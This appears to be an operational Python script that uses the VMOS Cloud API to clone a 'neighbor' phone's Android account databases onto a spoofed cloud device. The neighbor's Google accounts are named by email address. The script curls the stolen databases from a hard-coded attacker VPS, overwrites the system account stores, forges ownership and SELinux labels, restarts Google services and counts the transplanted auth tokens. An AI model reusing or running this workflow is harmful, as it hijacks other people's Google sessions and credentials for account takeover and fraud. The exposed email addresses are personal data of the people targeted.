#!/usr/bin/env python3
"""
Clone Restore — Push neighbor's account DBs to TARGET, fix perms, verify.
Source: 10.12.21.175 (SM-S9110, petersfaustina699@ + faustinapeters11@)
Target: APP5BJ4LRVRJFJQR (already has SM-S9110 identity)
VPS HTTP: 37.60.234.139:9999 serving neighbor_clones/
"""
import asyncio, sys, time
sys.path.insert(0, ".")
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

TARGET = "APP5BJ4LRVRJFJQR"
VPS = "37.60.234.139:9999"
TMP = "/data/local/tmp/clone"

# Files to push and their target paths + ownership
FILES = [
    # (remote_name, device_path, owner, selinux_context)
    ("accts_ce.db",        "/data/system_ce/0/accounts_ce.db",   "1000:1000", "u:object_r:accounts_data_file:s0"),
    ("accts_de.db",        "/data/system_de/0/accounts_de.db",   "1000:1000", "u:object_r:accounts_data_file:s0"),
    ("gsf_gservices2.db",  "/data/data/com.google.android.gsf/databases/gservices.db", None, None),
    ("phenotype.db",       "/data/data/com.google.android.gms/databases/phenotype.db", None, None),
]


async def cmd(client, pad, command, timeout=30, label=""):
    """Execute sync_cmd with retry."""
    for attempt in range(3):
        try:
            r = await client.sync_cmd(pad, command, timeout_sec=timeout)
            code = r.get("code", 0)
            if code == 200:
                data = r.get("data", [])
                if data and isinstance(data, list):
                    out = data[0].get("errorMsg") or ""
                    return out.strip()
                return ""
            elif code == 110012:  # timeout
                if attempt < 2:
                    print(f"    [{label}] timeout, retry {attempt+1}...")
                    await asyncio.sleep(3)
                    continue
                return None
            elif code == 110031:  # rate limit
                await asyncio.sleep(5)
                continue
            else:
                print(f"    [{label}] code={code}")
                return None
        except Exception as e:
            print(f"    [{label}] error: {e}")
            if attempt < 2:
                await asyncio.sleep(3)
    return None


async def main():
    t0 = time.time()
    client = VMOSCloudClient(
        ak="YOUR_VMOS_AK_HERE",
        sk="YOUR_VMOS_SK_HERE",
        base_url="https://api.vmoscloud.com"
    )

    print("=" * 70)
    print("  CLONE RESTORE — 10.12.21.175 (SM-S9110) → APP5BJ4LRVRJFJQR")
    print("=" * 70)

    # ── Step 0: Pre-flight ──
    print("\n[0] Pre-flight checks...")
    out = await cmd(client, TARGET, "id && getprop ro.product.model", label="preflight")
    print(f"    TARGET: {out}")
    if out is None:
        print("    FATAL: TARGET unreachable")
        return
    await asyncio.sleep(3)

    # ── Step 1: Prep work dir ──
    print("\n[1] Preparing work directory...")
    await cmd(client, TARGET, f"mkdir -p {TMP}", label="mkdir")
    await asyncio.sleep(3)

    # ── Step 2: Get current accounts (before) ──
    print("\n[2] Current state (BEFORE)...")
    out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -30 || echo NO_DUMPSYS", label="before")
    if out:
        for line in out.split("\n")[:15]:
            print(f"    {line}")
    await asyncio.sleep(3)

    # Check current accounts_ce.db
    out = await cmd(client, TARGET, "ls -la /data/system_ce/0/accounts_ce.db 2>/dev/null || echo MISSING", label="accts_check")
    print(f"    accounts_ce.db: {out}")
    await asyncio.sleep(3)

    # ── Step 3: Stop GMS and account services ──
    print("\n[3] Stopping GMS + account services...")
    stop_cmds = [
        "am force-stop com.google.android.gms",
        "am force-stop com.google.android.gsf",
        "am force-stop com.android.vending",
        "am force-stop com.google.android.gm",
        "am force-stop com.google.android.gm",
    ]
    await cmd(client, TARGET, " && ".join(stop_cmds), label="stop_gms")
    await asyncio.sleep(3)

    # ── Step 4: Download DB files from VPS (background + poll) ──
    print("\n[4] Downloading databases from VPS...")
    # Launch ALL downloads in background via nohup
    dl_cmds = []
    for remote_name, device_path, owner, ctx in FILES:
        dl_cmds.append(
            f"nohup sh -c 'curl -sf --connect-timeout 10 --max-time 120 "
            f"http://{VPS}/{remote_name} -o {TMP}/{remote_name} "
            f"&& echo DONE_{remote_name} >> {TMP}/dl_status.txt' "
            f">/dev/null 2>&1 &"
        )
    # Fire all downloads at once
    all_dl = f"rm -f {TMP}/dl_status.txt; " + " ".join(dl_cmds) + " echo LAUNCHED"
    await cmd(client, TARGET, all_dl, label="launch_downloads")
    print("    All downloads launched in background")
    await asyncio.sleep(5)

    # Poll for completion (all 4 files)
    expected = len(FILES)
    for attempt in range(20):  # up to 100s
        out = await cmd(client, TARGET, f"cat {TMP}/dl_status.txt 2>/dev/null | wc -l", label="poll_dl")
        done_count = 0
        try:
            done_count = int(out.strip()) if out else 0
        except:
            pass
        print(f"    Poll {attempt+1}: {done_count}/{expected} downloads complete")
        if done_count >= expected:
            break
        await asyncio.sleep(5)

    # Verify each file
    for remote_name, device_path, owner, ctx in FILES:
        check = await cmd(client, TARGET, f"ls -la {TMP}/{remote_name}", label=f"check_{remote_name}")
        print(f"    {remote_name}: {check}")
        await asyncio.sleep(2)

    # ── Step 5: Find GMS/GSF UIDs ──
    print("\n[5] Finding app UIDs...")
    gms_uid = await cmd(client, TARGET, "stat -c '%u:%g' /data/data/com.google.android.gms/ 2>/dev/null || echo '10092:10092'", label="gms_uid")
    gsf_uid = await cmd(client, TARGET, "stat -c '%u:%g' /data/data/com.google.android.gsf/ 2>/dev/null || echo '10087:10087'", label="gsf_uid")
    print(f"    GMS uid: {gms_uid}")
    print(f"    GSF uid: {gsf_uid}")
    await asyncio.sleep(3)

    # ── Step 6: Stop services again (belt + suspenders) ──
    print("\n[6] Final service stop before DB replacement...")
    await cmd(client, TARGET, "am force-stop com.google.android.gms && am force-stop com.google.android.gsf", label="stop2")
    await asyncio.sleep(3)

    # ── Step 7: Replace databases ──
    print("\n[7] Replacing databases...")

    # Backup existing
    await cmd(client, TARGET, "cp /data/system_ce/0/accounts_ce.db /data/system_ce/0/accounts_ce.db.bak 2>/dev/null; true", label="bak_ce")
    await asyncio.sleep(2)

    for remote_name, device_path, owner, ctx in FILES:
        print(f"    Installing {remote_name} → {device_path}")
        # Ensure target directory exists
        target_dir = "/".join(device_path.split("/")[:-1])
        await cmd(client, TARGET, f"mkdir -p {target_dir}", label=f"mkdir_{remote_name}")
        await asyncio.sleep(1)

        # Copy from tmp
        cp_out = await cmd(client, TARGET, f"cp {TMP}/{remote_name} {device_path}", label=f"cp_{remote_name}")
        await asyncio.sleep(1)

        # Set ownership
        if owner:
            real_owner = owner
        elif "gms" in device_path:
            real_owner = gms_uid if gms_uid else "10092:10092"
        elif "gsf" in device_path:
            real_owner = gsf_uid if gsf_uid else "10087:10087"
        else:
            real_owner = "1000:1000"

        await cmd(client, TARGET, f"chown {real_owner} {device_path}", label=f"chown_{remote_name}")
        await asyncio.sleep(1)

        await cmd(client, TARGET, f"chmod 660 {device_path}", label=f"chmod_{remote_name}")
        await asyncio.sleep(1)

        # Set SELinux context
        if ctx:
            await cmd(client, TARGET, f"chcon {ctx} {device_path}", label=f"chcon_{remote_name}")
        else:
            await cmd(client, TARGET, f"restorecon {device_path} 2>/dev/null; true", label=f"restorecon_{remote_name}")
        await asyncio.sleep(1)

        # Verify
        verify = await cmd(client, TARGET, f"ls -laZ {device_path}", label=f"verify_{remote_name}")
        print(f"      → {verify}")
        await asyncio.sleep(2)

    # ── Step 8: Also set the accounts_de.db SELinux ──
    print("\n[8] Ensuring accounts_de directory exists + perms...")
    await cmd(client, TARGET, "ls -laZ /data/system_de/0/ | head -10", label="de_check")
    await asyncio.sleep(3)

    # ── Step 9: Restart services ──
    print("\n[9] Restarting Google services...")
    # Kill all GMS processes
    await cmd(client, TARGET,
        "killall -9 com.google.android.gms 2>/dev/null; "
        "killall -9 com.google.android.gsf 2>/dev/null; "
        "killall -9 com.google.process.gapps 2>/dev/null; "
        "true", label="killall")
    await asyncio.sleep(5)

    # Trigger GMS restart
    await cmd(client, TARGET,
        "am startservice -n com.google.android.gms/.chimera.GmsIntentOperationService 2>/dev/null; "
        "am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED 2>/dev/null; "
        "true", label="restart_gms")
    await asyncio.sleep(8)

    # ── Step 10: Verify ──
    print("\n" + "=" * 70)
    print("  VERIFICATION")
    print("=" * 70)

    print("\n[10a] dumpsys account...")
    out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -50", timeout=30, label="verify_dumpsys")
    if out:
        for line in out.split("\n"):
            print(f"    {line}")
    await asyncio.sleep(3)

    print("\n[10b] accounts_ce.db on TARGET...")
    out = await cmd(client, TARGET,
        "sqlite3 /data/system_ce/0/accounts_ce.db 'SELECT _id, name, type FROM accounts;' 2>/dev/null || echo DB_ERROR",
        label="verify_sqlite")
    print(f"    {out}")
    await asyncio.sleep(3)

    print("\n[10c] auth tokens count...")
    out = await cmd(client, TARGET,
        "sqlite3 /data/system_ce/0/accounts_ce.db 'SELECT COUNT(*) FROM authtokens;' 2>/dev/null || echo 0",
        label="verify_tokens")
    print(f"    Token count: {out}")
    await asyncio.sleep(3)

    print("\n[10d] content provider query...")
    out = await cmd(client, TARGET,
        "content query --uri content://com.android.contacts/raw_contacts 2>/dev/null | head -5; "
        "content query --uri content://settings/secure --where \"name='account_manager_should_show_setup_wizard'\" 2>/dev/null || true",
        label="verify_content")
    if out:
        for line in out.split("\n")[:5]:
            print(f"    {line}")

    elapsed = time.time() - t0
    print(f"\n{'=' * 70}")
    print(f"  CLONE RESTORE COMPLETE — {elapsed:.0f}s")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    asyncio.run(main())
